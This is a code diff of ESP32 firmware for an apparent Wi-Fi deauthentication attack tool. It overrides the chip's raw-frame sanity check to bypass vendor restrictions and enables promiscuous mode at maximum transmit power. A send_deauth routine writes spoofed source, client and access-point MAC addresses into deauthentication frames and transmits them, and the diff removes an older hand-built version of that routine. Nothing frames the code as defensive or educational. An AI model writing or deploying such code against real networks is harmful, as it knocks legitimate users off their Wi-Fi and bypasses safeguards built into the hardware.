@@ -8,18 +8,36 @@
 #define CHANNEL 11
 #define MAX_AP_NUM 20
 
-
-
-int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
+{
     return 0;
 }
 
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
+    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
 }
 
 
+int start_wifi(wifi_mode_t mode, bool promiscious) {
+    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
+    ESP_ERROR_CHECK(esp_wifi_init(&wifi_cfg));
+    ESP_ERROR_CHECK(esp_wifi_set_mode(mode));
+    ESP_ERROR_CHECK(esp_wifi_start());
+    ESP_ERROR_CHECK(esp_wifi_set_channel(CHANNEL, WIFI_SECOND_CHAN_NONE));
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(promiscious));
 
+    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(20));
+
+    return 0;
+}
+
+int stop_wifi() {
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
+    ESP_ERROR_CHECK(esp_wifi_stop());
+    ESP_ERROR_CHECK(esp_wifi_deinit());
+
+    return 0;
+}
 
 typedef struct {
     char name[32];
@@ -125,7 +143,8 @@ static const uint8_t deauth_frame_default[] = {
 };
 
 void send_deauth(const uint8_t *source_mac, const uint8_t *client_addr, const uint8_t *ap_addr) {
-    uint8_t deauth_frame[sizeof(deauth_frame_default)];
+    static uint8_t deauth_frame[sizeof(deauth_frame_default)];
+
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
 
     memcpy(&deauth_frame[4], source_mac, 6);
@@ -134,36 +153,6 @@ void send_deauth(const uint8_t *source_mac, const uint8_t *client_addr, const ui
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
 }
-
-/*
-void send_deauth(const uint8_t *source_mac, const uint8_t *client_addr, const uint8_t *ap_addr) {
-    uint8_t deauth_frame[128] = {0};
-    int frame_len = 0;
-
-    deauth_frame[0] = 0xc0;
-    deauth_frame[1] = 0x00;
-
-    deauth_frame[2] = 0x3a;
-    deauth_frame[3] = 0x01;
-
-    memcpy(deauth_frame + 4, client_addr, 6);
-
-    memcpy(deauth_frame + 10, source_mac, 6);
-
-    memcpy(deauth_frame + 16, ap_addr, 6);
-
-    deauth_frame[22] = 0xf0;
-    deauth_frame[23] = 0xff;
-
-    deauth_frame[24] = 0x02;
-    deauth_frame[25] = 0x00;
-
-    frame_len = 25;
-
-//    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, frame_len, false);
-    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(frame_len));
-}
-*/
 
 AP* getSelectedAPs(menu Menu, AP* ap_info_list, int* selected_count) {
     AP* selected_aps = (AP*)malloc(Menu.length * sizeof(AP));
